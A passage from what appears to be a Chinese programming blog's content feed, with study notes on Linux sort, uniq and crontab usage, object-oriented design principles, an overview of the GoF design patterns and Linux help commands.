class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -t<span class="string">&#x27;:&#x27;</span> -k 3 -n</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110193958323.png" alt="image-20231110193958323"></p></li></ul><h3 id="uniq命令">uniq命令</h3><ul><li><p><code>uniq</code>命令用于过滤或者输出重复行。比如使用<code>history</code>查看最近执行过的命令，但只想查看使用了哪个命令而不需要知道具体干了什么，那么你可能就会要想去掉命令后面的参数然后去掉重复的命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> | <span class="built_in">cut</span> -c 8- | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 | <span class="built_in">uniq</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110194319562.png" alt="image-20231110194319562"></p><p>虽然<code>uniq</code>去除了大部分重复行，但可以看出这里仍然存在两条<code>ls</code>的记录，这是因为<code>uniq</code>命令只能去除连续的重复行，而非全文去重，如果需要达到全文去重的效果，那么需要对字段先进行排序操作：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> | <span class="built_in">cut</span> -c 8- | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 | <span class="built_in">sort</span> | <span class="built_in">uniq</span></span><br></pre></td></tr></table></figure><p>或者：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> | <span class="built_in">cut</span> -c 8- | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 | <span class="built_in">sort</span> -u</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110194620796.png" alt="image-20231110194620796"></p></li><li><p>如果希望查看重复的行，再分别统计重复次数：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> | <span class="built_in">cut</span> -c 8- | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -dc</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110194746551.png" alt="image-20231110194746551"></p><p>仅查看重复的行，而不统计重复次数：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> | <span class="built_in">cut</span> -c 8- | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -D</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231110194831567.png" alt="image-20231110194831567"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象设计原则</title>
      <link href="/posts/f9c29644.html"/>
      <url>/posts/f9c29644.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>设计模式系列文章导航</strong></p><ol><li><a href="/posts/bb7571ed.html">设计模式概述</a></li><li><a href="/posts/f9c29644.html">面向对象设计原则</a> 📍当前位置</li><li><a href="/posts/659b9bb9.html">设计模式 - 创建型模式</a></li><li><a href="/posts/b6c6dbc4.html">设计模式 - 结构型模式</a></li><li><a href="/posts/3194e4c1.html">设计模式 - 行为型模式</a></li></ol></blockquote><h2 id="概述">概述</h2><ul><li><p>软件的<strong>可维护性</strong><span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">可维护性</span><span class="reference-title">参考资料</span></span></span>和<strong>可复用性</strong><span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">可复用性</span><span class="reference-title">参考资料</span></span></span>是两个非常重要的用于衡量软件质量的属性。</p><table><thead><tr><th>原则名称</th><th>英文名称</th><th>定义</th><th style="text-align:center">使用频率</th></tr></thead><tbody><tr><td>单一职责原则</td><td>Single Responsibility Principle， SRP</td><td>一个对象应该只包含单一的职责，并且该职责被完整的封装在一个类中</td><td style="text-align:center">★★★★☆</td></tr><tr><td>开闭原则</td><td>Open-Closed Principle， OCP</td><td>软件实体应当对扩展开放，对修改关闭</td><td style="text-align:center">★★★★★</td></tr><tr><td>里氏代换原则</td><td>Liskov Substitution Principle， LSP</td><td>所有引用基类的地方必须能透明地使用其子类的对象</td><td style="text-align:center">★★★★★</td></tr><tr><td>依赖倒转原则</td><td>Dependence Inversion Principle， DIP</td><td>高层模块不应该以来低层模块，它们都应该依赖抽象；抽象不应该依赖于细节，细节应该依赖于抽象</td><td style="text-align:center">★★★★★</td></tr><tr><td>接口隔离原则</td><td>Interface Segregation Principle， ISP</td><td>客户端不应该依赖那些它不需要的接口</td><td style="text-align:center">★★☆☆☆</td></tr><tr><td>合成复用原则</td><td>Composite Reuse Principle， CRP</td><td>有线使用对象组合，而不是通过继承来打到复用的目的</td><td style="text-align:center">★★★★☆</td></tr><tr><td>迪米特法则</td><td>Law of Demeter， LoD</td><td>每一个软件单位对其他单位都只有最少的知识，而且局限于那些与本单位密切相关的软件单位</td><td style="text-align:center">★★★☆☆</td></tr></tbody></table></li></ul><h2 id="单一职责原则">单一职责原则</h2><ul><li><p>定义：<strong>一个对象应该只包含单一的职责</strong>，并且该职责被完整地封装在一个类中。</p></li><li><p>另一种定义方式：就一个类而言，应该仅有一个引起它变化的原因。</p></li><li><p>在软件系统中，一个类承担的职责越多，它被复用的可能性就越小，而且一个类承担的职责过多，相当于将这些职责耦合在一起，当其中一个职责变化时可能会影响其他职责的运作，因此要将这些职责进行分离，将不同的职责封装在不同的类中，即将不同的变化原因封装在不同的类中，如果多个职责总是同时发生改变则可将他们封装在同一类中。</p><blockquote><p>在<code>CustomerDataChart</code>类的方法中，<code>getConnection()</code>方法用于连接数据库，<code>findCustomers()</code>用于查询所有的客户信息，<code>createChart()</code>用于创建图表，<code>displayChart()</code>用于显示图表。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231107110617712.png" alt="image-20231107110617712"></p><p><code>CustomerDataChart</code>类承担了太多的职责，既包含与数据库相关的方法，又包含与图表生成和显示相关的方法。如果在其他类中也需要连接数据库或者使用<code>findCustomers()</code>方法查询客户信息，则难以实现代码的重用。无论是修改数据库连接方式还是修改图表显示方式都需要修改该类，它拥有不止一个引起它变化的原因，违背了单一职责原则。因此需要对该类进行拆分，使其满足单一职责原则，<code>CustomerDataChart</code>类可拆分为以下3个类。</p><ol><li><code>DBUtil</code>：负责连接数据库，包含数据库连接方法<code>getConnection()</code></li><li><code>CustomerDAO</code>：负责操作数据库中的Customer表，包含对Customer表的增、删、改、查等方法，例如<code>findCustomers()</code></li><li><code>CustomerDataChart</code>：负责图表的生成和显示，包含<code>createChart()</code>和<code>displayChart()</code>方法</li></ol><p>重构后的结构图：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231107110956731.png" alt="image-20231107110956731"></p></blockquote></li></ul><h2 id="开闭原则">开闭原则</h2><ul><li>开闭原则是面向对象的可复用设计的第一块基石，定义：<strong>软件实体应当对扩展开放，对修改关闭</strong>，即软件实体应<strong>尽量在不修改原有代码的情况下进行扩展</strong>。</li><li>任何软件都需要面临一个很重要的问题，即需求会随着时间的推移而发生变化。当软件系统需要面对新的需求时应尽量保证系统的设计框架是稳定的。如果一个软件设计符合开闭原则，那么可以非常方便地对系统进行扩展，而且在扩展时无须修改现有代码，使得软件系统在拥有适应性和灵活性的同时具备较好的稳定性和延续性。随着软件规模越来越大，寿命越来越长，维护成本也越来越高，设计满足开闭原则的软件也变得越来越重要。为了满足开闭原则，需要对系统进行<strong>抽象化设计</strong>，抽象化是开闭原则的关键，定义系统的抽象层，再通过具体的类进行扩展。</li></ul><h2 id="里氏替换原则">里氏替换原则</h2><blockquote><p>如果对每一个类型为S的对象o1都有类型为T的对象o2，使得以T定义的所有程序P在所有的对象o1都代换o2时程序P的行为没有变化，那么类型S是类型T的子类型。</p></blockquote><ul><li>通俗来说，里氏替换原则即<strong>所有引用基类的地方必须能透明地使用其子类的对象</strong>，表明<strong>在软件中将一个基类对象替换成它的子类对象，程序将不会产生任何错误和异常</strong>，反之则不成立。比如：如果我喜欢所有动物，那么我一定喜欢狗，因为狗是动物的子类；但如果我喜欢狗，并不能断定我喜欢所有的动物。</li><li>里氏替换原则是实现开闭原则的重要方法之一，由于在使用基类对象的地方都可以使用子类对象，因此在程序中尽量使用基类类型来对对象进行定义，而在运行时在确定其子类的类型，用子类对象来替换父类对象。</li><li>在运用里氏替换原则时应该将父类设计为抽象类或者接口，让子类继承父类或实现父类接口，并实现在父类中声明的方法，在运行时子类实例替换父类实例，可以很方便地扩展系统的功能，无需修改原有子类的代码，增加新的功能可以通过增加一个新的子类来实现。</li></ul><h2 id="依赖倒转原则">依赖倒转原则</h2><ul><li><p>依赖倒转原则是面向对象设计的主要实现机制之一，它是系统抽象化的具体实现。</p></li><li><p>依赖倒转原则的定义：<strong>高层模块不应该依赖低层模块，它们都应该依赖抽象。抽象不应该依赖于细节，细节应该依赖于抽象。<strong>简单地说，依赖倒转原则要求</strong>针对接口编程，不要针对实现编程</strong>。</p></li><li><p>依赖倒转原则要求在程序代码中传递参数时或在关联关系中尽量引用层次高的抽象层类，即使用接口和抽象类进行变量类型声明、参数类型声明、方法返回类型声明，以及数据类型的转换等，而非使用具体类来做这些事情。一个具体类应当只实现接口或者抽象类中声明过的方法，而不要给出多余的方法，否则将无法调用到在子类中增加的新方法。</p></li><li><p>引入抽象层后，系统具有很好的灵活性，在程序中<strong>尽量使用抽象层进行编程</strong>，而将具体类写在配置文件中，这样如果系统行为发生变化，只需要对抽象层进行扩展，并修改配置文件，而无需修改原有系统的源代码。</p></li><li><p>实现依赖倒转原则需要针对抽象层编程，而将具体类通过依赖注入的方式注入到其他对象中。依赖注入是指当一个对象要与其他对象发生依赖关系时采用抽象的形式来注入所依赖的对象。</p><blockquote><p>常见的注入方式有3种：</p><ol><li>构造注入：通过构造函数来传入具体类的对象</li><li>设值注入（Setter注入）：通过Setter方法来传入具体类的对象</li><li>接口注入：通过在接口中声明的业务方法来传入具体类的对象</li></ol></blockquote></li></ul><h2 id="接口隔离原则">接口隔离原则</h2><ul><li>接口隔离原则定义：<strong>客户端不应该依赖那些它不需要的接口</strong>。当一个接口太大时需要将它分割成一些更细小的接口，使用该接口的客户端仅需要知道与之相关的方法即可。</li><li>“接口”有两种含义：<ul><li>如果理解为一个类型所提供的所有方法特征的集合的时候，可以将接口理解成角色，一个接口只能代表一个角色，每个角色都有它特地的一个接口，此时这个原则可以叫“角色隔离原则”。</li><li>如果把接口理解成狭义的特定语言的接口，那么接口隔离原则表达的意思是指接口仅仅提供客户端需要的行为，客户端不需要的行为则隐藏起来，应当为客户端提供尽可能小的单独的接口，而不要提供大的总接口。</li></ul></li></ul><h2 id="合成复用原则">合成复用原则</h2><ul><li>合成复用原则又称组合/聚合复用原则，定义：<strong>优先使用对象组合，而不是通过继承来达到复用的目的</strong>，即在一个新的对象里通过关联关系（包裹组合关系和聚合关系）来使用一些已有的对象，使之成为新对象的一部分，新对象通过委派<strong>调用已有对象</strong>的方法达到复用功能的目的。</li><li>通过继承来进行复用的主要问题在于继承复用会破坏系统的封装性，因为继承会将基类的实现细节暴露给子类，由于基类的某些内部细节对于子类来说是可见的，因此这种复用又称为“白箱”复用，如果基类发生改变，那么子类的实现也不得不发生改变。</li><li>组合或聚合关系可以将已有的对象（亦可称为成员对象）纳入到新对象中，使之成为新对象的一部分，因此新对象可以调用已有对象的功能，这样做可以使成员对象的内部实现对于新对象不可见，所以这种复用又称为“黑箱”复用。</li></ul><h2 id="迪米特法则">迪米特法则</h2><ul><li><p>迪米特法则定义：<strong>每一个软件单位对其他单位都只有最少的知识，而且局限于那些与本单位密切相关的软件单位</strong>。其要求一个软件实体应当尽可能少地与其他实体发生相互作用。如果一个系统符合迪米特法则，那么当其中的某一个模块发生修改时就会尽量少地影响其他模块，扩展会相对容易。</p></li><li><p>应用迪米特法则可以降低系统的耦合度，使类与类之间保持松散的耦合关系。</p></li><li><p>迪米特法则还有几种定义形式，例如：不要和“陌生人”说话，只与你的直接朋友通信，“朋友”包括如下几类：</p><ol><li>当前对象本身</li><li>以参数形式传入到当前对象方法中的对象</li><li>当前对象的成员对象</li><li>如果当前对象的成员对象是一个集合，那么集合中的元素也都是朋友</li><li>当前对象所创建的对象</li></ol><p>这样做可以降低系统的耦合度，一个对象的改变不会给太多其他对象带来影响。</p></li><li><p>迪米特法则还要求在设计系统时应该尽量减少对象之间的交互，如果两个对象之间不必彼此直接通信，那么这两个对象就不应当发生任何直接的相互作用，如果其中一个对象需要调用另一个对象的方法，可以通过“第三者”转发这个调用。</p></li></ul><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="javascript:void">维护性是指软件能够被理解、改正、适应及扩展的难易程度</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="javascript:void">可复用性是指软件能够被重复使用的难易程度</a></div>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 面向对象设计原则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式概述</title>
      <link href="/posts/bb7571ed.html"/>
      <url>/posts/bb7571ed.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>设计模式系列文章导航</strong></p><ol><li><a href="/posts/bb7571ed.html">设计模式概述</a> 📍当前位置</li><li><a href="/posts/f9c29644.html">面向对象设计原则</a></li><li><a href="/posts/659b9bb9.html">设计模式 - 创建型模式</a></li><li><a href="/posts/b6c6dbc4.html">设计模式 - 结构型模式</a></li><li><a href="/posts/3194e4c1.html">设计模式 - 行为型模式</a></li></ol></blockquote><h2 id="什么是设计模式">什么是设计模式</h2><ul><li><p>设计模式是一种用于对软件系统中不断重现的设计问题的解决方案进行文档化的技术，目的是提高代码的可维护性、可扩展性、重用性和可靠性，以及让他人更容易理解代码。</p></li><li><p>GoF对设计模式的定义如下：</p><blockquote><p>设计模式是在特定环境下为解决某一通用软件设计问题提供的一套定制的解决方案，该方案描述了对象和类之间的相互作用。</p></blockquote></li></ul><h2 id="设计模式的基本要素">设计模式的基本要素</h2><ol><li><p>模式名称</p><p>每种设计模式都有一个名称来描述模式的问题、解决方案和效果，以便开发人员更好地理解模式并方便沟通交流。</p></li><li><p>问题</p><p>问题描述了应该在何时使用模式，包含了设计中存在的问题以及问题存在的原因。</p></li><li><p>解决方案</p><p>解决方案描述了设计模式的组成成分，以及这些组成成分之间的相互关系、各自的职责和协作方式。</p></li><li><p>效果</p><p>效果描述了模式应用的效果以及在使用模式时应权衡的问题。</p></li></ol><h2 id="设计模式的分类">设计模式的分类</h2><ul><li>通常情况下都是按照目的来划分各种设计模式，可以分为创建型（Creational）、结构性（Structural）和行为型（Behavioral）3类。</li><li>以下23种设计模式并非都是孤立存在的，很多模式之间存在联系，例如访问者模式操作对象结构中的元素时通常需要使用迭代器模式，在解释器模式中定义终结符表达式和非终结符表达式时可以使用组合模式。因此，如果合理搭配不同的设计模式，可以充分发挥每种设计模式的优势，完成一些更复杂的设计工作。</li></ul><h3 id="创建型模式">创建型模式</h3><ul><li>创建型模式主要用于<strong>创建对象</strong>，包括如下5种模式：</li></ul><table><thead><tr><th>模式名称</th><th style="text-align:left">英文名称</th><th>模式说明</th><th style="text-align:center">使用频率</th></tr></thead><tbody><tr><td>抽象工厂模式</td><td style="text-align:left">Abstract Factory</td><td>提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类</td><td style="text-align:center">★★★★★</td></tr><tr><td>建造者模式</td><td style="text-align:left">Builder</td><td>将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示</td><td style="text-align:center">★★☆☆☆</td></tr><tr><td>工厂方法模式</td><td style="text-align:left">Factory Method</td><td>定义一个用于创建对象的接口，但是让子类决定将哪一个类实例化。工厂方法模式让一个类的实例化延迟到其子类</td><td style="text-align:center">★★★★★</td></tr><tr><td>原型模式</td><td style="text-align:left">Prototype</td><td>使用原型实例指定待创建对象的类型，并且通过复制这个原型来创建新的对象</td><td style="text-align:center">★★★☆☆</td></tr><tr><td>单例模式</td><td style="text-align:left">Singleton</td><td>确保一个类只有一个实例，并提供一个全局访问点来访问这个唯一实例</td><td style="text-align:center">★★★★☆</td></tr></tbody></table><h3 id="结构型模式">结构型模式</h3><ul><li>结构型模式主要用于<strong>处理类或对象的组合</strong>，包括如下7种模式：</li></ul><table><thead><tr><th>模式名称</th><th>英文名称</th><th>模式说明</th><th>使用频率</th></tr></thead><tbody><tr><td>适配器模式</td><td>Adapter</td><td>将一个类的接口转换成客户希望的另一个接口，让不兼容的类可以一起工作</td><td>★★★★☆</td></tr><tr><td>桥接模式</td><td>Bridge</td><td>将抽象部分与它的实现部分解耦，使得两者都能够独立变化</td><td>★★★☆☆</td></tr><tr><td>组合模式</td><td>Composite</td><td>组合多个对象形成树形结构以表示具有部分-整体关系的层次结构，让客户端可以统一对待单个对象和组合对象</td><td>★★★★☆</td></tr><tr><td>装饰模式</td><td>Decorator</td><td>动态地给一个对象增加一些额外的职责，就扩展功能而言，装饰模式提供可一种比使用子类更加灵活的替代方案</td><td>★★★☆☆</td></tr><tr><td>外观模式</td><td>Facade</td><td>为子系统中的一组接口提供一个统一的入口，外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用</td><td>★★★★★</td></tr><tr><td>享元模式</td><td>Flyweight</td><td>运用共享技术有效地支持大量细粒度对象的复用</td><td>★☆☆☆☆</td></tr><tr><td>代理模式</td><td>Proxy</td><td>给某一个对象提供一个代理或占位符，并由代理对象来控制对原对象的访问</td><td>★★★★☆</td></tr></tbody></table><h3 id="行为型模式">行为型模式</h3><ul><li>行为型模式主要用于<strong>描述类或对象怎样交互和怎样分配职责</strong>，包括如下11种模式：</li></ul><table><thead><tr><th>模式名称</th><th>英文名称</th><th>模式说明</th><th>使用频率</th></tr></thead><tbody><tr><td>职责链模式</td><td>Chain of Responsibility</td><td>避免将一个请求的发送者与接受者耦合在一起，让多个对象都有机会处理请求，或接收请求的对象连接成一条链，并且沿着这条链传递请求，直到有一个对象能够处理它为止</td><td>★★☆☆☆</td></tr><tr><td>命令模式</td><td>Command</td><td>将一个请求封装为一个对象，从而可用不同的请求对客户进行参数化，对请求排队或者记录请求日志，以及支持可撤销的操作</td><td>★★★★☆</td></tr><tr><td>解释器模式</td><td>Interpreter</td><td>给定一个语言，定义它的文法的一种表示，并给定一个解释器，这个解释器使用该表示方法来解释语句中的句子</td><td>★☆☆☆☆</td></tr><tr><td>迭代器模式</td><td>Iterator</td><td>提供一种方法顺序访问一个聚合对象中的各个元素，而又不用暴露该对象的内部表示</td><td>★★★★★</td></tr><tr><td>中介者模式</td><td>Mediator</td><td>定义一个对象来封装一系列对象的交互，中介者模式使各对象之间不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互</td><td>★★☆☆☆</td></tr><tr><td>备忘录模式</td><td>Memento</td><td>在不破坏封装的前提下捕获一个对象的内部状态，并在该对象之外保存这个状态，这样可以在以后将对象恢复到原先保存的状态</td><td>★★☆☆☆</td></tr><tr><td>观察者模式</td><td>Observer</td><td>定义对象之间的一种一对多依赖关系，使得每当一个对象状态发生改变时其相关依赖对象皆得到通知并被自动更新</td><td>★★★★★</td></tr><tr><td>状态模式</td><td>State</td><td>允许一个对象在其内部状态改变时改变它的行为，对象看起来似乎是修改了它的类</td><td>★★★☆☆</td></tr><tr><td>策略模式</td><td>Strategy</td><td>定义一系列算法，将每一个算法封装起来，让他们可以相互替换，使得算法可以独立于使用它的客户而变化</td><td>★★★★☆</td></tr><tr><td>模板方法模式</td><td>Template Method</td><td>定义一个操作中算法的框架，而将一些步骤延迟到子类中，使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤</td><td>★★★☆☆</td></tr><tr><td>访问者模式</td><td>Visitor</td><td>表示一个作用于某对象结构中的各个元素的操作，可以在不改变各个元素的类的前提下定义作用于这些元素的新操作</td><td>★☆☆☆☆</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux任务计划crontab</title>
      <link href="/posts/b38a663c.html"/>
      <url>/posts/b38a663c.html</url>
      
        <content type="html"><![CDATA[<h2 id="crontab简介">crontab简介</h2><ul><li><p><code>crontab</code>命令用于设置周期性被执行的命令，并将其存放于 crontab 文件中，以供之后读取和执行。</p></li><li><p><code>crontab</code>储存的指令被守护进程激活，<code>crond</code>为其守护进程，<code>crond</code>常常在后台运行，每一分钟会检查一次是否有预定的作业需要执行。</p></li><li><blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure></blockquote></li></ul><h2 id="crontab准备">crontab准备</h2><ul><li><p>使用<code>rsyslog</code>可以通过日志中的信息来得知任务是否被执行了：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install -y rsyslog</span><br><span class="line">sudo<span class="built_in"> service </span>rsyslog start</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231103174614045.png" alt="image-20231103174614045"></p></li></ul><h2 id="crontab使用">crontab使用</h2><h3 id="新增任务">新增任务</h3><ul><li><p>首先来添加一个计划任务：</p>  <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crontab -e</span></span><br></pre></td></tr></table></figure><p>如果是第一次启动则会出现如下内容，选择编辑工具，通常使用2号vim工具：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231103174813614.png" alt="image-20231103174813614"></p></li><li><p>接下来会进入下面的界面，这个界面就是添加计划的地方：<br><img src="https://oss.iuoyt.com/img/posts/image-20231103175001232.png" alt="image-20231103175001232"></p></li><li><p>接下来按下<kbd>i</kbd>进入编辑模式，在最后一行添加如下内容，作用是每分钟在用户目录下创建一个以当前的年月日时分秒为名字的空白文件：</p>  <figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * * touch /home/shiyanlou/$(<span class="keyword">date</span> +\%Y\%m\%d\%H\%M\%S)</span><br></pre></td></tr></table></figure></li><li><p>然后按下<kbd>Esc</kbd>，输入<code>:wq</code>保存并退出，输入如下指令查看文件内容：</p>  <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crontab -l</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231103180017702.png" alt="image-20231103180017702"></p></li><li><p>虽然已经添加了任务，但如果cron的进程并没有启动，那么任务也不会被执行，可以通过如下两种方式确定cron是否已启动：</p>  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 第一种</span></span><br><span class="line">ps aux <span class="string">| grep cron</span></span><br><span class="line"><span class="meta"># 第二种</span></span><br><span class="line">pgrep cron</span><br></pre></td></tr></table></figure></li><li><p>如果已经启动，在用户目录下使用<code>ll</code>命令，可以看到：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231103180524732.png" alt="image-20231103180524732"></p></li><li><p>通过如下命令可以查看到执行任务命令之后在日志中的信息反馈：</p>  <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tail -f /<span class="keyword">var</span>/<span class="built_in">log</span>/syslog</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231103180704821.png" alt="image-20231103180704821"></p></li></ul><h3 id="删除任务">删除任务</h3><ul><li><p>当不需要再自动执行任务，可以使用如下命令：</p>  <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crontab -r</span></span><br></pre></td></tr></table></figure></li><li><p>执行后再查看任务列表，可以看到已经没有正在执行的任务：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231103180918834.png" alt="image-20231103180918834"></p></li></ul><h3 id="系统级任务">系统级任务</h3><ul><li><p>如果需要定义系统级别定时任务，可以使用sudo权限编辑crontab文件：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim <span class="regexp">/etc/</span>crontab</span><br></pre></td></tr></table></figure></li><li><p>cron服务的最小检测时间为分钟，所以cron每分钟会去文件中读取一次内容</p></li></ul><h3 id="cron的相关文件">cron的相关文件</h3><ul><li><p>在<code>/etc</code>目录下查看cron相关的文件：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ll</span> /etc | <span class="keyword">grep</span> cron</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231103181401458.png" alt="image-20231103181401458"></p></li><li><p>其中部分作用如下：</p></li></ul><table><thead><tr><th style="text-align:center">目录</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><code>/etc/cron.daily</code></td><td style="text-align:center">在每天的6点25分时执行一次</td></tr><tr><td style="text-align:center"><code>/etc/cron.hourly</code></td><td style="text-align:center">在每小时的17分钟时执行一次</td></tr><tr><td style="text-align:center"><code>/etc/cron.monthly</code></td><td style="text-align:center">在每月1号的6点52分时执行一次</td></tr><tr><td style="text-align:center"><code>/etc/cron.weekly</code></td><td style="text-align:center">在每周第七天的6点47分时执行一次</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的帮助命令</title>
      <link href="/posts/8039f3ce.html"/>
      <url>/posts/8039f3ce.html</url>
      
        <content type="html"><![CDATA[<h2 id="内建命令与外部命令">内建命令与外部命令</h2><h3 id="内建命令">内建命令</h3><ul><li>内建命令是shell的一部分，包含一些比较简单的系统命令，通常在Linux系统加载运行时就会被驻留在内存系统中，因此执行速度比外部命令快。</li></ul><h3 id="外部命令">外部命令</h3><ul><li>外部命令是Linux系统中的实用程序部分，因为功能较为强大，其包含的程序量也会很大，所以不能随着系统启动被加载到内存中。</li></ul><h3 id="查看命令的类型">查看命令的类型</h3><ul><li><p>使用<code>type</code>命令可以查看其为内建或是外部命令：</p>  <figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> &lt;命令&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231027193923068.png" alt="image-20231027193923068"></p></li><li><p>通常会得到如下结果：</p></li></ul><table><thead><tr><th style="text-align:center">结果</th><th style="text-align:center">类别</th></tr></thead><tbody><tr><td style="text-align:center"><code>xxx is a shell builtin</code></td><td style="text-align:center">内建命令</td></tr><tr><td style="text-align:center"><code>xxx is /usr/bin/xxx</code></td><td style="text-align:center">外部命令</td></tr><tr><td style="text-align:center"><code>xxx is an alias for xx --xxx</code></td><td style="text-align:center">命令别名</td></tr></tbody></table><h2 id="帮助命令的使用">帮助命令的使用</h2><h3 id="help命令">help命令</h3><ul><li><p>help命令是用于显示shell内建命令的简要帮助信息，因此无法得到外部命令或者命令别名的相关帮助，比如输入<code>help ls</code>命令则会得到“无匹配帮助主题”的提示。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231027194155526.png" alt="image-20231027194155526"></p></li><li><p>而对于外部命令，通常带有一个获取帮助的参数<code>--help</code>，输入以获取该命令的帮助文档：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span 